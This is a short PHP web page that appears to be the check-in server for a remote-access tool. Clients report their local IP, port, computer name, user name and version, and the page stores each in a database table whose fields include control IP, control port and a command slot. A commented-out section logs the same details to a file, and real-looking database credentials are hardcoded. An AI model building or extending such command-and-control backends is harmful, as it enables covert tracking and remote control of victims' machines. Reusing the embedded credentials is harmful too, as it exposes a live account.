<!doctype HTML>
<html>
    <head>
        <title>YOP</title>
    </head>
    
    <body>
        <p>wazabi</p>
        <?php
		$know = 0;
		$bdd = new PDO('mysql:host=mysql.hostinger.fr;dbname=u950431307_sql0;charset=utf8', 'u950431307_yop', '123bonsoir');
		$jour = date("d");
		$heure = date("H");
		$heure2 = intval($heure) + 2;
		$minute = date("i");
		$ip = $_SERVER['REMOTE_ADDR'];
        $ipLocal = $_GET['ipLocal'];
		$port = $_GET['port'];
		$computerName = $_GET['compName'];
		$userName = $_GET['userName'];
		if(isset($_GET['version']))
		{
			$version = $_GET['version'];
		}
		else
		{
			$version = '<2.0';
		}
		
		$reponse = $bdd->prepare('SELECT * FROM ls WHERE ip = :IP AND ipLocal = :IPLOCAL');
		$reponse->execute(array(
		'IP' => $ip,
		'IPLOCAL' => $ipLocal
		));
		while($donnes = $reponse->fetch())
		{
			if($donnes['user_name'] == $_GET['userName']/* && $donnes['port'] == $_GET['port']*/)
			{
				echo 'know';
				$know = 1;
			}
		}
		$reponse->closeCursor();
		$ctrl = 0;
		$ipControl = '127.0.0.1';
		$portControl = 0;
		
		if($know != 1)
		{
			echo 'YOLO';
			$req = $bdd->prepare('INSERT INTO ls(ip, ipLocal, port, pc_name, user_name, date, ctrl, ipControl, portControl, version, cmd) VALUES(:IP, :IPLOCAL, :PORT, :PCNAME, :USER, NOW(), :CTRL, :IPCONTROL, :PORTCONTROL, :VERSION, :CMD)');
			$req->execute(array(
				'IP' => $ip,
				'IPLOCAL' => $ipLocal,
				'PORT' => $port,
				'PCNAME' => $computerName,
				'USER' => $userName,
				'CTRL' => $ctrl,
				'IPCONTROL' => $ipControl,
				'PORTCONTROL' => $portControl,
				'VERSION' => $version,
                'CMD' => 'NULL'
			));
		}
		else{
			$req2 = $bdd->prepare('UPDATE ls SET ip = :IP, ipLocal = :IPLOCAL, port = :PORT, pc_name = :PCNAME, user_name = :USER, date = NOW(), version = :VERSION WHERE ip = :IP AND ipLocal = :IPLOCAL');
			$req2->execute(array(
			'IP' => $ip,
			'IPLOCAL' => $ipLocal,
			'PORT' => $port,
			'PCNAME' => $computerName,
			'USER' => $userName,
			'VERSION' => $version
			));
		}
		
		/*$fileD = fopen('connected.txt', 'r');
		$ligne = fgets($fileD);
		fclose($fileD);
		if(intval($ligne) == intval($jour))
		{
			$file = fopen('connected.txt', 'a+');
			fputs($file, 'ip: ' . $ip . ' | ipLocal: ' . $ipLocal . ' | port: ' . $port . ' | computer name: ' . $computerName . ' | userName: ' . $userName . ' | heure: ' . $heure2 . ':' . $minute);
			fputs($file, "\n");
		}
		else{
			$file = fopen('connected.txt', 'w');
			fputs($file, $jour);
			fputs($file, "\n");
			fputs($file, 'ip: ' . $ip . ' | ipLocal: ' . $ipLocal . ' | port: ' . $port . ' | computer name: ' . $computerName . ' | userName: ' . $userName . ' | heure: ' . $heure2 . ':' . $minute);
			fputs($file, "\n");
		}
        fclose($file);*/
        ?>
    </body>
    
</html
